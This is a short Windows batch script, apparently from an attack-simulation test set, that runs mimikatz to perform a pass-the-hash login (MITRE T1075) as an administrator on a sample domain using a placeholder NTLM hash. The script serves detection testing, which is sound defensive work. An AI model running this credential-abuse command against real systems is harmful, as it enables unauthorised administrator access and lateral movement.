@ECHO OFF
CLS
color 0E


ECHO ==================================================================
ECHO Technique: Pass The Hash	(T1075)
ECHO.
ECHO [+] Simulate Pass-The-Hash (PTH) using 'MIMIKATZ' 
ECHO ------------------------------------------------------------------
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:aria.com /ntlm:cc36gf7a8514793efccd3326464tkg1a" exit
ping 127.0.0.1 -n 3 > nul
ECHO.

